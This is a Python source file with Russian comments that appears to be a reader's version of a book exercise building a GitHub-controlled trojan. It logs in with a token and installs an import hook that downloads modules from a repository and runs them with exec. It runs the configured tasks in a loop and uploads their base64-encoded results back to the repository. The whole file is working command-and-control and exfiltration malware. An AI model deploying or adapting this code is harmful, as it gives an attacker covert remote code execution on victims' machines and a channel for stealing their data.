import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime
from importlib.machinery import ModuleSpec

def github_connect():
    with open('mytoken.txt') as f:
        token = f.read().strip()
    # ВАЖНО: ваш логин GitHub
    user = 'nikitahaah'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def get_file_contents(dirname, module_name, repo):
    # Возвращает сырые данные файла
    return repo.file_contents(f'{dirname}/{module_name}').content

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, name, path=None, target=None):
        if name in sys.modules:
            return None
        
        print(f"[*] Attempting to retrieve {name}")
        try:
            self.repo = github_connect()
            new_library = get_file_contents('modules', f'{name}.py', self.repo)
            
            if new_library is not None:
                print(f"[*] Found {name}.py on GitHub!")
                # В новых версиях github3.py контент может приходить уже декодированным
                if isinstance(new_library, bytes):
                    self.current_module_code = base64.b64decode(new_library).decode('utf-8')
                else:
                    try:
                        self.current_module_code = base64.b64decode(new_library).decode('utf-8')
                    except Exception:
                        # Если строка уже декодирована, оставляем как есть
                        self.current_module_code = new_library
                
                return ModuleSpec(name, self)
        except Exception as e:
            print(f"[!] Error retrieving {name}: {e}")
            
        return None

    def create_module(self, spec):
        return None 

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.repo = github_connect()

    def get_config(self):
        print("[*] Downloading config...")
        config_json = get_file_contents('config', self.config_file, self.repo)
        
        try:
            config_data = base64.b64decode(config_json)
        except Exception:
            config_data = config_json
            
        config = json.loads(config_data)
        print(f"[*] Config loaded. Tasks: {[t['module'] for t in config]}")
        
        for task in config:
            if task['module'] not in sys.modules:
                print(f"[*] Trying to import {task['module']}")
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        print(f"[*] Running module: {module}")
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        
        # Кодируем результат обратно в base64 перед отправкой на GitHub
        bindata = bytes('%r' % data, 'utf-8')
        encoded_data = base64.b64encode(bindata)
        
        print(f"[*] Uploading results to {remote_path}")
        self.repo.create_file(remote_path, message, encoded_data)

    def run(self):
        while True:
            try:
                config = self.get_config()
                for task in config:
                    thread = threading.Thread(
                        target=self.module_runner,
                        args=(task['module'],)
                    )
                    thread.start()
                    time.sleep(random.randint(1, 3)) # Небольшая пауза между модулями
                
                print("[*] Sleeping before next check (Ctrl+C to exit)...")
                time.sleep(30) # Для теста ждем 30 секунд (в оригинале книги 30-180 минут)
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
                time.sleep(10)

if __name__ == '__main__':
    # Регистрируем наш импортер в системе импорта Python
    sys.meta_path.insert(0, GitImporter())
    # Запускаем троян (по умолчанию ID = 'abc')
    trojan_id = sys.argv[1] if len(sys.argv) > 1 else 'abc'
    Trojan(trojan_id).run()